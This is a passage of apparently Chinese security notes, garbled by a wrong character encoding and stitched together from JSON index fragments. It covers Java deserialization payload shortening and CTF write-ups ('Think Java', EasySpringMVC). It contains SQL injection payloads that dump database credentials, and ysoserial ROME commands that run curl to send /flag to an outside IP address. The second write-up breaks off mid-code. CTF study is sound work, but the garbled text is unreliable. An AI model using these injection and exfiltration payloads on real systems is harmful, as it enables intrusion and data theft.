åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ï¼Œå½“æˆ‘ä»¬éœ€è¦è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œå†ä»è¿™äº›â¼†è¿›åˆ¶æµä¸­ååºåˆ—åŒ–å‡ºå¯¹è±¡ã€‚æ‰€ä»¥å¯ä»¥åœ¨ä¸€äº›ç»§æ‰¿å…³ç³»å¤æ‚çš„ç±»ä¸Šè¿›è¡Œå†æ¬¡ç¼©çŸ­çš„å°è¯•ã€‚ æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ class A extends B{ public String a; public A(String a){ this.a = a; } public void a(){ System.out.println(this.a); } private synchronized void writeObject(ObjectOutputStream s) throws IOException { s.defaultWriteObject(); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object a = gf.get(\"a\", null); System.out.println(a); } } class B implements Serializable{ public String b; public void setB(String b) { this.b = b; } public void b(){ System.out.println(this.b); } } è¿™æ˜¯ä¸€ä¸ªAä¸ºå­ç±»ï¼ŒBä¸ºçˆ¶ç±»ä¸”Aç±»ç»§æ‰¿Bç±»çš„å¯åºåˆ—åŒ–çš„è§„åˆ™ï¼Œé‚£ä¹ˆå‡è®¾æˆ‘ä»¬åªéœ€è¦Aç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¸éœ€è¦Bç±»ä¸Šçš„ä»»ä½•å±æ€§å’Œæ–¹æ³•ï¼Œèƒ½å¦åšåˆ°åªåºåˆ—åŒ–çš„Aç±»è€Œä¸æ¶‰åŠBç±»ï¼Ÿ ä¸€èˆ¬æ¥è¯´ï¼Œç›´æ¥é€šè¿‡åºåˆ—åŒ–ç»§æ‰¿çˆ¶ç±»çš„å­ç±»ï¼Œåœ¨è¾“å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ€»æ˜¯å¯ä»¥æ‰¾åˆ°çˆ¶ç±»çš„å½±å­ï¼ŒåŒæ—¶javaåŸç”Ÿç±»ä¸å¯ç›´æ¥è¿›è¡Œè¦†å†™ï¼Œå‡è®¾æˆ‘ä»¬èƒ½å¤Ÿè¦†å†™ä¸Šè¿°çš„Aç±»ï¼Œæˆ‘è¦å®ç°ä¸Šè¿°çš„ç›®æ ‡æˆ‘åªéœ€è¦å»ºç«‹å¦‚ä¸‹çš„Aç±» class A implements Serializable{ private static final long serialVersionUID = 8884587499101437051L; public String a; public A(String a){ this.a = a; } public void a(){ System.out.println(this.a); } private synchronized void writeObject(ObjectOutputStream s) throws IOException { s.defaultWriteObject(); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object a = gf.get(\"a\", null); System.out.println(a); } } é‚£ä¹ˆæˆ‘ä»¬å†æ¬¡åºåˆ—åŒ–çš„æ—¶å€™ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å°±ä¼šç›¸è¾ƒäºåŸå…ˆç»§æ‰¿Bç±»çš„Aç±»ç¼©çŸ­è®¸å¤šï¼Œäºæ˜¯ä½ ç›´æ¥æ‹¿ç€ç”Ÿæˆçš„æ–°çš„äºŒè¿›åˆ¶æ–‡ä»¶å°è¯•åœ¨åŸæœ‰çš„å…³ç³»ä¸Šè¿›è¡Œååºåˆ—åŒ–ï¼Œ ä¼šå‘ç°javaçˆ†å‡ºå¦‚ä¸‹é”™è¯¯ Exception in thread \"main\" java.io.InvalidClassException: A; local class incompatible: stream classdesc serialVersionUID = -7257149293589931179, local class serialVersionUID = 8884587499101437051 è¿™é‡Œå°±æ¶‰åŠåˆ° serialVersionUID çš„æ¦‚å¿µã€‚ä»¥ä¸‹ä¸ºä¸ªäººç†è§£ï¼Œè¯¦ç»†å¯å‚è€ƒ ä¸ºä»€ä¹ˆserialVersionUIDä¸èƒ½éšä¾¿æ”¹ serialVersionUID è™šæ‹Ÿæœºæ˜¯å¦å…è®¸ååºåˆ—åŒ–ï¼Œ ä¸ä»…å–å†³äºç±»è·¯å¾„å’ŒåŠŸèƒ½ä»£ç æ˜¯å¦â¼€è‡´ï¼Œ â¼€ä¸ªâ¾®å¸¸é‡è¦çš„â¼€ç‚¹æ˜¯ä¸¤ä¸ªç±»çš„åºåˆ—åŒ– ID æ˜¯å¦â¼€è‡´ï¼Œ å³serialVersionUIDè¦æ±‚â¼€è‡´ã€‚ åŒæ—¶è¿™æ¶‰åŠåˆ°äº† Serializable å’Œ Externalizable æ¥å£çš„é—®é¢˜ ç±»é€šè¿‡å®ç° java.io.Serializable æ¥å£ä»¥å¯ç”¨å…¶åºåˆ—åŒ–åŠŸèƒ½ã€‚æœªå®ç°æ­¤æ¥å£çš„ç±»å°†æ— æ³•è¿›è¡Œåºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ã€‚å¯åºåˆ—åŒ–ç±»çš„æ‰€æœ‰å­ç±»å‹æœ¬èº«éƒ½æ˜¯å¯åºåˆ—åŒ–çš„ã€‚ å¦‚æœæŸ¥é˜…è¿‡Serializableçš„æºç ï¼Œå°±ä¼šå‘ç°ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªç©ºçš„æ¥å£ï¼Œé‡Œé¢ä»€ä¹ˆä¸œè¥¿éƒ½æ²¡æœ‰ï¼ŒSerializableæ¥å£æ²¡æœ‰æ–¹æ³•æˆ–å­—æ®µï¼Œä»…ç”¨äºæ ‡è¯†å¯åºåˆ—åŒ–çš„è¯­ä¹‰ã€‚ é‚£ä¹ˆå®ƒæ˜¯æ€ä¹ˆä¿è¯åªæœ‰å®ç°äº†è¯¥æ¥å£çš„æ–¹æ³•æ‰èƒ½è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–å‘¢ï¼ŸåŸå› æ˜¯åœ¨æ‰§è¡Œåºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨ java.io.ObjectOutputStream#writeObject0 ä¸­æ‰§è¡Œäº†å¦‚ä¸‹ä»£ç  if (obj instanceof String) { writeString((String) obj, unshared); } else if (cl.isArray()) { writeArray(obj, desc, unshared); } else if (obj instanceof Enum) { writeEnum((Enum) obj, desc, unshared); } else if (obj instanceof Serializable) { writeOrdinaryObject(obj, desc, unshared); } else { if (extendedDebugInfo) { throw new NotSerializableException( cl.getName() + \"\\n\" + debugInfoStack.toString()); } else { throw new NotSerializableException(cl.getName()); } } åœ¨è¿›è¡Œåºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šåˆ¤æ–­è¦è¢«åºåˆ—åŒ–çš„ç±»æ˜¯å¦æ˜¯Enumã€Arrayå’ŒSerializableç±»å‹ï¼Œå¦‚æœéƒ½ä¸æ˜¯åˆ™ç›´æ¥æŠ›å‡ºNotSerializableExceptionã€‚ Javaä¸­è¿˜æä¾›äº†Externalizableæ¥å£ï¼Œä¹Ÿå¯ä»¥å®ç°å®ƒæ¥æä¾›åºåˆ—åŒ–èƒ½åŠ›ï¼Œä½†æ˜¯ä½¿ç”¨æ—¶éœ€è¦å¼€å‘äººå‘˜é‡å†™writeExternal()ä¸readExternal()è¿™ä¸¤ä¸ªæŠ½è±¡æ–¹æ³•ã€‚ è‡ªå®šä¹‰çš„åºåˆ—åŒ–ç­–ç•¥ åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè¢«åºåˆ—åŒ–çš„ç±»ä¸­å®šä¹‰äº†writeObject å’Œ readObject æ–¹æ³•ï¼Œè™šæ‹Ÿæœºä¼šè¯•å›¾è°ƒç”¨å¯¹è±¡ç±»é‡Œçš„ writeObject å’Œ readObject æ–¹æ³•ï¼Œè¿›è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ å¦‚æœæ²¡æœ‰è¿™æ ·çš„æ–¹æ³•ï¼Œåˆ™é»˜è®¤è°ƒç”¨æ˜¯ ObjectOutputStream çš„ defaultWriteObject æ–¹æ³•ä»¥åŠ ObjectInputStream çš„ defaultReadObject æ–¹æ³•ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å»æ‰¾å‡ ä¸ªjavaä¸­å®ç°åºåˆ—åŒ–æ¥å£çš„ç±»ï¼Œå¯ä»¥å‘ç°è¿™äº›ç±»é™¤äº†å®ç°äº†Serializableå¤–ï¼Œè¿˜å®šä¹‰äº†ä¸€ä¸ªserialVersionUID java.lang.String java.util.HashMap ç¡®å®šserialVersionUIDçš„é‡è¦æ€§ è°ˆåŠä¹‹å‰çš„æŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›åˆ° javaio.ObjectStreamClass#initNonProxyï¼Œå…¶ä¸­æ¶‰åŠ serialVersionUID ä»£ç å¦‚ä¸‹ if (model.serializable == osc.serializable && !cl.isArray() && suid != osc.getSerialVersionUID()) { throw new InvalidClassException(osc.name, \"local class incompatible: \" + \"stream classdesc serialVersionUID = \" + suid + \", local class serialVersionUID = \" + osc.getSerialVersionUID()); } åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¯¹serialVersionUIDåšäº†æ¯”è¾ƒï¼Œå¦‚æœå‘ç°ä¸ç›¸ç­‰ï¼Œåˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ æ·±å…¥ getSerialVersionUID æ–¹æ³• public long getSerialVersionUID() { // REMIND: synchronize instead of relying on volatile? if (suid == null) { suid = AccessController.doPrivileged( new PrivilegedAction() { public Long run() { return computeDefaultSUID(cl); } } ); } return suid.longValue(); } åœ¨æ²¡æœ‰å®šä¹‰serialVersionUIDçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨computeDefaultSUID æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„serialVersionUIDã€‚ä¹Ÿå°±æ˜¯è¯´javaä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¯¹å…¶ serialVersionUID åšä¸¥æ ¼çš„æ ¡éªŒã€‚ ä½†æ˜¯ï¼Œåªè¦ç‰ˆæœ¬å·ç›¸åŒï¼Œå³ä½¿æ›´æ”¹äº†åºåˆ—åŒ–å±æ€§ï¼Œå¯¹è±¡ä¹Ÿå¯ä»¥æ­£ç¡®è¢«ååºåˆ—åŒ–å›æ¥ã€‚ ä½¿ç”¨é»˜è®¤æœºåˆ¶åœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œä¸ä»…ä¼šåºåˆ—åŒ–å½“å‰å¯¹è±¡ï¼Œè¿˜ä¼šå¯¹è¯¥å¯¹è±¡å¼•ç”¨çš„å…¶å®ƒå¯¹è±¡ä¹Ÿè¿›è¡Œåºåˆ—åŒ–ï¼ŒåŒæ ·åœ°ï¼Œè¿™äº›å…¶å®ƒå¯¹è±¡å¼•ç”¨çš„å¦å¤–å¯¹è±¡ä¹Ÿå°†è¢«åºåˆ—åŒ–ã€‚ å½“ç„¶æˆ‘è¿˜æ²¡æœ‰è¶³å¤Ÿä¸°å¯Œçš„ç»éªŒå»ç›´æ¥ä¿®æ”¹å®ƒä»¬ä¹‹é—´çš„äº¤äº’ï¼Œä½†æ˜¯å¯ä»¥è‚¯å®šçš„æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹ serialVersionUID çš„æƒ…å†µä¸‹å°½å¯èƒ½çš„åˆ å‡æˆ‘ä»¬ä¸éœ€è¦çš„partï¼Œè®©æ•´ä¸ªåºåˆ—åŒ–å˜å¾—æ›´ç®€çº¦ï¼Œç”Ÿæˆçš„äºŒè¿›åˆ¶æ•°æ®ä¹Ÿå°±ä¼šæ›´ç®€çŸ­ã€‚ é€šè¿‡serialVersionUIDæ§åˆ¶å…¼å®¹æ€§ ä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨ä¸Šè¿°çš„ä¾‹å­ä¸­ç»™ç»§æ‰¿çˆ¶ç±»åºåˆ—åŒ–çš„å­ç±»Aå’Œè‡ªå·±å¯å•ç‹¬åºåˆ—åŒ–çš„Aç±»é€šè¿‡ serialVersionUID è§„å®šä¸€ä¸ªæ ‡å‡† private static final long serialVersionUID = 8884587499101437051L; åºåˆ—åŒ–åä¼šå‘ç°ä¸åŸç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨å­—èŠ‚æ•°ç›®ä¸Šæ²¡æœ‰æ”¹å˜ï¼Œè€Œæ˜¯ä¿®æ”¹äº†å…¶ä¸­å‡ ä¸ªå­—èŠ‚ï¼Œå†æ¬¡å°è¯•ååºåˆ—åŒ–ä¼šå‘ç°å¯ä»¥ç”Ÿæˆè¿™ä¸¤ç§ä¸åŒAç±»çš„å¯¹è±¡ï¼Œjavaè‡ªèº«è¾¾åˆ°äº†å…¼å®¹æ€§ï¼Œè€Œæˆ‘ä»¬ä¹Ÿåœ¨æ­¤åŸºç¡€ä¸Šè¿›ä¸€æ­¥ç¼©çŸ­äº†payloadçš„é•¿åº¦ã€‚ è‡ªå®šä¹‰javaåŸç”Ÿç±» æµ‹è¯•åå‘ç°åœ¨ BadAttributeValueExpException ç»§æ‰¿å…³ç³»å’Œ TemplatesImpl å±æ€§ä¸Šç¨ä½œæ–‡ç« ä¸ä¼šå½±å“è¿™ä¸ªåºåˆ—åŒ–è¿‡ç¨‹ï¼Œ å°¤å…¶æ˜¯åœ¨å®šä¹‰ BadAttributeValueExpException æœ¬èº«å¯åºåˆ—åŒ–åå¤§å¹…åº¦ç¼©çŸ­payloadé•¿åº¦ï¼Œé‡‡å–çš„æ–¹å¼æ˜¯é€šè¿‡ideaå¯¹åº”ç‰ˆæœ¬ç¼–è¯‘classæ¥ä¿®æ”¹ jre/lib/rt.jar ä¸­classã€‚ public class BadAttributeValueExpException implements Serializable { private static final long serialVersionUID = -3105272988410493376L; private Object val; ... å› ä¸ºæœ¬èº«åœ¨ROMEé“¾çš„è°ƒç”¨ä¸­æˆ‘ä»¬åªéœ€è¦ javax.management.BadAttributeValueExpException#readObjectï¼Œè€Œå®ç°æ­¤æ–¹æ³•åªéœ€è¦ BadAttributeValueExpException æœ¬èº«ç»§æ‰¿åºåˆ—åŒ–çš„æ¥å£å³å¯ï¼Œä¿è¯ serialVersionUID ä¸€è‡´å³å¯ åœ¨ TemplatesImpl å¯¹è±¡ä¸­ï¼ŒTemplatesæ¥å£å’Œ Serailizableæ¥å£æ˜¯ååºåˆ—åŒ–çš„å…³é”®ï¼Œ è€Œ_transletIndex åœ¨æ•´ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸ä¼šèµ·åˆ°ä»»ä½•ä½œç”¨ï¼Œæ­¤å¤–åœ¨ newTransformer æ–¹æ³•ä¸­å¦‚ä¸‹æ˜¯è§¦å‘æ¶æ„ç±»æ³¨å…¥çš„å…³é”®è¯­å¥ transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); ä½†æ˜¯æˆ‘ä»¬åªæ‰§è¡Œ getTransletInstance æ–¹æ³•å¹¶ä¸” _tfactory ä¼šåœ¨readObjectæ–¹æ³•ä¸­è‡ªåŠ¨èµ‹å€¼ private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException { is.defaultReadObject(); if (is.readBoolean()) { _uriResolver = (URIResolver) is.readObject(); } _tfactory = new TransformerFactoryImpl(); } åœ¨æ‰§è¡Œ getTransletInstance çš„è¿‡ç¨‹ä¸­ä¼šå®Œæˆæ¶æ„ç±»çš„æ‰§è¡Œï¼Œå‰©ä¸‹çš„ä¸¤ä¸ªå‚æ•° _outputProperties å’Œ _indentNumberåªéœ€è¦å­˜åœ¨å³å¯ï¼Œä½†æˆ‘ä»¬ä¸éœ€è¦å°†å…¶å†™å…¥æˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è€Œæ˜¯ç”±javaç‰ˆæœ¬è‡ªå·±å…¼å®¹èµ‹å€¼ä¸ºnullå’Œ0 è¿™ä¸¤æ­¥ç»¼åˆå¯ä»¥åœ¨åŸå…ˆå¯¹å­—èŠ‚çš„è¿½æ±‚ä¸Šå†ç¼©çŸ­45%ã€‚ "},"javanote/javatest.html":{"url":"javanote/javatest.html","title":"Javaç›¸å…³é¢˜å‹å¤ç°","keywords":"","body":"Java Test è®°å½•Javaé¢˜çš„è¿‡ç¨‹ mavené¡¹ç›®å¿«é€Ÿæ­å»º [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java æºç ç»™äº† class, åç¼–è¯‘å®¡è®¡, ä¸»è¦æ˜¯ Test.class å’Œ sqlDict.class, Test.class è°ƒç”¨ sqlDict.class @CrossOrigin @RestController @RequestMapping({\"/common/test\"}) public class Test { public Test() { } @PostMapping({\"/sqlDict\"}) @Access @ApiOperation(\"ä¸ºäº†å¼€å‘æ–¹ä¾¿å¯¹åº”æ•°æ®åº“å­—å…¸æŸ¥è¯¢\") public ResponseResult sqlDict(String dbName) throws IOException { List tables = SqlDict.getTableData(dbName, \"root\", \"abc@12345\"); return ResponseResult.e(ResponseCode.OK, tables); } } æ ¹æ® import å’Œ apiæ¥å£åˆ¤å®šä»–æ˜¯ swagger-ui import io.swagger.annotations.ApiOperation; å¸¸ç”¨çš„æœ‰ swagger-ui.html, è¿›å…¥åä¸¤ä¸ªæ¥å£, ä¸€ä¸ªéœ€è¦ç”¨æˆ·åå¯†ç ç™»å½•, å¦ä¸€ä¸ªå°±æ˜¯å­—å…¸æŸ¥è¯¢ String sql = \"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '\" + dbName + \"' and table_name='\" + TableName + \"';\"; ç›´æ¥æ‹¼æ¥çš„æ‰€ä»¥å°è¯•æœ‰æ²¡æœ‰ sqlæ³¨å…¥, jdbcè¿æ¥ç¤ºä¾‹ jdbc:mysql://127.0.0.1:3306/name?useUnicode=true&xx=xxxx&xx=xx å°è¯• sqlæ³¨å…¥ ?dbName=myapp?useUnicode=-1'union+select+database()%23 ?dbName=myapp?useUnicode=-1'union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema='myapp'%23 ?dbName=myapp?useUnicode=-1'union+select+group_concat(column_name)+from+information_schema.columns+where+table_name='user'%23 ?dbName=myapp?useUnicode=-1'union+select+group_concat(id,'~',name,'~',pwd)+from+user%23 å¾—åˆ°ç”¨æˆ·åå¯†ç  admin/admin@Rrrr_ctf_asde ç™»å½•æˆåŠŸåç»™äº†ä¸€é•¿ä¸²data { \"data\":\"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\", \"msg\":\"ç™»å½•æˆåŠŸ\", \"status\":2, \"timestamps\":1627307693537 } ä¸‹æ–¹çš„ç‰¹å¾å¯ä»¥ä½œä¸ºåºåˆ—åŒ–çš„æ ‡å¿—å‚è€ƒ: ä¸€æ®µæ•°æ®ä»¥rO0ABå¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯JAVAåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®ã€‚ æˆ–è€…å¦‚æœä»¥acedå¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µjavaåºåˆ—åŒ–çš„16è¿›åˆ¶ã€‚ å‚è€ƒåå…ˆå°†æ•°æ®åšå¤„ç† # -*-coding:utf-8-*- # python 2.7 import base64 data = \"rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\" r = base64.b64decode(data).encode('hex') print(r) ä¸‹è½½ , ä½¿ç”¨ java -jar SerializationDumper-v1.13.ja r aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c0002696474 00104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372 000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e 756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 24 - 0x00 18 Value - cn.abc.core.model.UserVo - 0x636e2e6162632e636f72652e6d6f64656c2e55736572566f serialVersionUID - 0x76 46 43 31 7b 04 f4 3a newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Object - L - 0x4c fieldName Length - 2 - 0x00 02 Value - id - 0x6964 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 16 - 0x00 10 Value - Ljava/lang/Long; - 0x4c6a6176612f6c616e672f4c6f6e673b 1: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 02 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 03 classdata cn.abc.core.model.UserVo values id (object) TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 14 - 0x00 0e Value - java.lang.Long - 0x6a6176612e6c616e672e4c6f6e67 serialVersionUID - 0x3b 8b e4 90 cc 8f 23 df newHandle 0x00 7e 00 04 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Long - L - 0x4a fieldName Length - 5 - 0x00 05 Value - value - 0x76616c7565 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_CLASSDESC - 0x72 className Length - 16 - 0x00 10 Value - java.lang.Number - 0x6a6176612e6c616e672e4e756d626572 serialVersionUID - 0x86 ac 95 1d 0b 94 e0 8b newHandle 0x00 7e 00 05 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 06 classdata java.lang.Number values java.lang.Long values value (long)1 - 0x00 00 00 00 00 00 00 01 name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 07 Length - 5 - 0x00 05 Value - admin - 0x61646d696e æœ€ä¸‹æ–¹æœ‰è¿™æ ·ä¸€æ®µåŒ…å«ç€adminå­—æ®µï¼Œå®ƒå°±ç›¸å½“äºä¿å­˜ç€å®è´¨ä¿¡æ¯çš„æ•°æ®å—, å½“æŠŠåºåˆ—åŒ–çš„tokenå­—æ®µä½œä¸ºAuthorizationå»å°è¯è¿™ä¸ªUIçš„user/currentæ¥å£ã€‚ä»–ä¹Ÿä¼šæ˜¾ç¤ºæˆåŠŸç™»å½•ã€‚è¿™è¯´æ˜ï¼Œä»–ä¼šåœ¨currentæ¥å£è¿›è¡Œååºåˆ—åŒ–ï¼é‚£ä¹ˆå¯ä»¥æ„é€ åˆé€‚çš„åºåˆ—åŒ–å†…å®¹æ¥æ„é€ getshell å¦‚ä½•æ„é€ ? javaååºåˆ—åŒ–å·¥å…·ysoserial ysoserialç”¨æ³•:ä»¥ROMEå’ŒURLDNSä¸¾ä¾‹ å³ç”¨ROME(æˆ‘ç°åœ¨çš„è®¤çŸ¥å°±æ˜¯ä»–æ¯ä¸€ç§éƒ½æœ‰ä¸åŒçš„ä½œç”¨ï¼Œæ¯”å¦‚romeå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼ŒURLDNSå¯ä»¥è¿›è¡Œdnså›æ˜¾)ã€‚ java -jar ysoserial.jar ROME \"calc.exe\" > h3zh1.bin java -jar ysoserial.jar URLDNS \"http://xxx\" > h3zh1.bin å†è½¬base64å³å¯, è¿™é‡Œå¯èƒ½æ²¡æœ‰ bash æ‰€ä»¥ shell å¼¹ä¸å‡ºæ¥, ç”¨ curl æ•°æ®å¤–å¸¦(å‘½ä»¤æ‰§è¡Œé‚£ä¸ª payloadä¸å¥½ç”Ÿæˆ) java -jar ysoserial.jar ROME \"curl http://39.97.114.43:8888 -F file=@/flag\" > outcome.bin java -jar ysoserial.jar ROME \"curl http://39.97.114.43:8888 -d @/flag\" > outcome.bin ç„¶åå†™ä¸ªåŠ å¯†è„šæœ¬burpsuiteæ‰“è¿‡å»å…¬ç½‘ç›‘å¬å³å¯ # -*-coding:utf-8-*- # python 2.7 import base64 file = open(\"outcome.bin\", \"rb\") now = file.read() ba = base64.b64encode(now) # print(ba) print(\"Bearer \"+ba) #å¯ä»¥è§£æ³¨é‡Šæ­¤æ®µï¼Œå¹¶æ³¨é‡Šä¸Šä¸€æ¡print,ä¾¿äºå¿«é€Ÿæµ‹è¯• file.close() [V&N2020 javaååºåˆ—åŒ–]EasySpringMVC ç»™äº† waråŒ…, è§£å‹åé€šè¿‡ fernflower.jar è¿›è¡Œåç¼–è¯‘å¾—åˆ°åŸæœ‰çš„ javaæ–‡ä»¶ java -jar fernflower.jar .\\springmvcdemo_2 .\\springmvcdemo IDEA æ²¡æœ‰Springé¡¹ç›®çš„è§£å†³æ–¹æ³• IDEAæ˜¯2020ç‰ˆæœ¬ï¼Œä¸”æ˜¯æ——èˆ°ç‰ˆï¼Œä½†ä»Šå¤©æƒ³æ–°å»ºä¸€ä¸ªSpringMVCé¡¹ç›®çš„æ—¶å€™ï¼Œå‘ç°æ²¡æœ‰Springé€‰é¡¹ã€‚ è§£å†³æ–¹æ¡ˆ: æŒ‰å¿«æ·é”®ç»„åˆctrl+alt+shift+/ï¼Œç„¶åé€‰registerï¼Œæ¥ç€æ‰¾åˆ°javaee.legacy.project.wizardï¼Œé€‰ä¸­ï¼Œcloseå°±å¥½äº† åœ¨IDEAæ–°å»ºä¸€ä¸ªSpringé¡¹ç›®ï¼Œå¹¶å‹¾é€‰SpringMVC, å°†åç¼–è¯‘åæ–‡ä»¶å¤¹å†…çš„comåŒ…æ‹–åˆ°srcç›®å½•ï¼Œlibç›®å½•çš„jarå¤åˆ¶åˆ°libç›®å½•ï¼ŒWEB-INFç›®å½•ä¹Ÿæ›¿æ¢æ‰, ç„¶ååœ¨File->Project Structureæ·»åŠ libçš„è·¯å¾„ æ¥ç€, æ·»åŠ tomcatæœåŠ¡å™¨ï¼Œå¹¶è®¾ç½®ApplicationContextï¼Œè¿™ä¸ªå€¼è¡¨ç¤ºwebappçš„è®¿é—®æ ¹è·¯å¾„ ç„¶åå¯åŠ¨å³å¯è®¿é—® webapp, ä½†æ˜¯æ²¡æœ‰å¤ªå¤§æ”¶è·, çœ‹çœ‹web.xml, web.xmlæ˜¯J2EEå®šä¹‰çš„æè¿°è¿™ä¸ªwebappçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œéå¸¸é‡è¦ã€‚å†…å®¹å¦‚ä¸‹ã€‚ contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener clientinfo com.filters.ClentInfoFilter clientinfo * dispatcher org.springframework.web.servlet.DispatcherServlet 1 dispatcher *.form æœ€ä¸‹é¢è¿™æ®µ dispatcher *.form è¯¥é…ç½®æ–‡ä»¶ç”¨servlet-mappingæŒ‡æ˜æ‰€æœ‰*.formæ ¼å¼è·¯å¾„çš„è®¿é—®äº¤ç»™åä¸ºdispatcherçš„servletå¤„ç†ã€‚servletå°±æ˜¯å¤„ç†HTTPè¯·æ±‚çš„æ ¸å¿ƒç±»ã€‚ dispatcher org.springframework.web.servlet.DispatcherServlet 1 å†çœ‹è¿™ä¸€æ®µï¼Œè¡¨æ˜è¿™ä¸ªdispatcher servletæ˜¯ä¸€ä¸ªorg.springframework.web.servlet.DispatcherServletï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªwebappä½¿ç”¨äº†Springæ¡†æ¶ã€‚ clientinfo com.filters.ClentInfoFilter clientinfo * è¿™ä¸€æ®µå®šä¹‰äº†ä¸€ä¸ª filter, è¡¨ç¤ºå¯¹æ‰€æœ‰servletçš„è®¿é—®ï¼Œéƒ½éœ€è¦ç»è¿‡com.filters.ClentInfoFilterç±»ã€‚filterçš„ä½œç”¨ä¸€èˆ¬æ˜¯åœ¨HTTPè¯·æ±‚åˆ°è¾¾servletä¹‹å‰æˆ–ä¹‹åï¼Œå¯¹HTTPè¯·æ±‚æˆ–å“åº”è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚æ£€æŸ¥è¿™ä¸ªè¯·æ±‚æ˜¯å¦æ‹¥æœ‰æƒé™ã€‚ åœ¨å¯¹Controllerä»”ç»†æ’æŸ¥åæ²¡æœ‰å‘ç°ä»»ä½•æœ‰ç”¨ä¿¡æ¯ï¼Œå…³æ³¨ç‚¹è½¬ç§»åˆ°è¿™ä¸ªfilterä¸Šã€‚ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { Cookie[] cookies = ((HttpServletRequest)request).getCookies(); 